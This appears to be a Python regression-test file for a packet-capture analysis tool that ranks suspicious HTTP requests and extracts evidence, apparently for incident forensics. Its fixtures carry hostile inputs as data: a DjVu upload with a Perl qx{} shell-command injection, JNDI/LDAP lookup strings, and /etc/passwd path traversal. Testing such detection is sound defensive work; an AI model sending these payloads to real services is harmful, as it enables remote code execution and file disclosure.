"""Regression tests for cross-service attack-flow ranking, not a CVE oracle."""
import unittest

from attack_flow_ranker import find_http_request_leads, format_ranked_flow_leads
from evidence_extractor import EvidenceExtractor, PacketRecord


def packet(frame, text, direction="client->server", src="10.0.0.1:50000", dst="10.0.0.2:80"):
    if direction == "server->client":
        src, dst = dst, src
    return PacketRecord(frame, float(frame), src, dst, direction, "TCP", text, len(text))


class FlowRankingTests(unittest.TestCase):
    def test_late_exploit_request_not_hidden_by_large_prior_response(self):
        early = packet(10, "GET /signin HTTP/1.1\r\nHost: example\r\n\r\n")
        large = packet(11, "HTTP/1.1 200 OK\r\n\r\n" + "x" * 55000, "server->client")
        upload = packet(29, "POST /uploads/user HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\n"
                         'Content-Disposition: form-data; name="file"; filename="test.jpg"\r\n'
                         'AT&TFORM DJVUINFO (metadata qx{touch /tmp/success})')
        error = packet(31, "HTTP/1.1 422 Unprocessable Entity\r\n\r\n", "server->client")
        leads = find_http_request_leads([early,large,upload,error], 26)
        self.assertEqual(len(leads), 1)
        lead = leads[0]
        self.assertEqual(lead.request_frame, 29)
        self.assertGreaterEqual(lead.score, 10)
        self.assertEqual(lead.response_code, 422)
        self.assertIn("shell command expression", lead.indicators)
        self.assertIn("uploaded file signature differs", " ".join(lead.indicators))
        self.assertIn("status alone does not prove exploit outcome", lead.observation())
        evidence = EvidenceExtractor().extract(stream_id=26, packets=[early,large,upload,error])
        matches = [e for e in evidence["indicator"] if "HTTP request candidate" in e.observation]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].frame_number, 29)
        self.assertRegex(matches[0].evidence_id, r"^E-S0026-F000029-\d{3}$")

    def test_request_body_in_following_packet_is_preserved(self):
        records = [
            packet(5, "POST /anything HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\n"),
            packet(6, "data header\nqx{echo hello}"),
            packet(7, "HTTP/1.1 400 Bad Request\r\n\r\n", "server->client"),
        ]
        lead = find_http_request_leads(records)[0]
        self.assertEqual((lead.request_frame,lead.indicator_frame,lead.response_frame),(5,5,7))
        self.assertIn("shell command expression",lead.indicators)

    def test_background_redis_not_rated_as_attack(self):
        records = [packet(2040,"*2\r\n$3\r\nget\r\n$52\r\ncache:gitlab:settings\r\n")]
        self.assertEqual(find_http_request_leads(records, 28), [])

    def test_response_only_payload_does_not_count_as_client_exploit(self):
        records = [packet(20,"HTTP/1.1 200 OK\r\n\r\nqx{touch /tmp/test}","server->client")]
        self.assertEqual(find_http_request_leads(records), [])

    def test_no_generic_upload_success_claim(self):
        records = [packet(10,"POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\nhello")]
        lead = find_http_request_leads(records)[0]
        self.assertLessEqual(lead.score, 3)
        self.assertNotIn("exploit succeeded",lead.observation().lower())

    def test_jndi_and_path_traversal_generalize(self):
        logs = [packet(2,"GET /a/../../etc/passwd HTTP/1.1\r\n\r\n"),
                packet(3,"HTTP/1.1 404 Not Found\r\n\r\n", "server->client")]
        self.assertIn("path traversal",find_http_request_leads(logs)[0].indicators)
        jndi = packet(15,"POST /log HTTP/1.1\r\n\r\nhello ${jndi:ldap://host/a}")
        self.assertIn("JNDI lookup", ",".join(find_http_request_leads([jndi])[0].indicators))

    def test_percent_encoded_jndi_lookup_in_get_query(self):
        records = [packet(8,"GET /solr/admin/cores?action=$%7Bjndi:ldap://example.org/a%7D HTTP/1.1\r\n\r\n"),
                   packet(12,"HTTP/1.1 400 Bad Request\r\n\r\n", "server->client")]
        lead = find_http_request_leads(records)[0]
        self.assertIn("JNDI lookup expression", lead.indicators)
        self.assertEqual(lead.response_code, 400)

    def test_sensitive_query_parameter_redacted(self):
        records = [packet(2,"GET /admin/../../etc/passwd?token=SECRET123 HTTP/1.1\r\n\r\n")]
        leads = find_http_request_leads(records)
        self.assertNotIn("SECRET123",leads[0].observation())
        self.assertIn("[REDACTED]",leads[0].observation())

    def test_top_rank_not_selected_by_flow_volume(self):
        routine = find_http_request_leads([packet(1,"POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\ncontent")], 7)
        exploit = find_http_request_leads([packet(24,"POST /test HTTP/1.1\r\n\r\n${jndi:ldap://example/a}")], 26)
        summary = format_ranked_flow_leads(routine + exploit)
        self.assertLess(summary.index("Rank 1: TCP stream 26"), summary.index("Rank 2: TCP stream 7"))

    def test_long_untrusted_request_path_is_bounded_for_contract(self):
        records = [packet(9,"POST /"+ "a"*250 + "?token=SECRETVALUE HTTP/1.1\r\n\r\nqx{test}")]
        lead = find_http_request_leads(records)[0]
        self.assertLessEqual(len(lead.observation()), 500)
        evidence = EvidenceExtractor().extract(stream_id=1, packets=records)
        self.assertTrue(any("HTTP request candidate" in e.observation for e in evidence["indicator"]))
        self.assertNotIn("SECRETVALUE", " ".join(e.observation for e in evidence["indicator"]))

    def test_does_not_modify_any_cve_or_attack_success(self):
        lead = find_http_request_leads([packet(29,"POST /upload HTTP/1.1\r\n\r\nqx{touch /tmp/file}")])[0]
        text = lead.observation()
        self.assertNotIn("CVE-", text)
        self.assertIn("not proof", text)

if __name__ == "__main__":
    unittest.main()
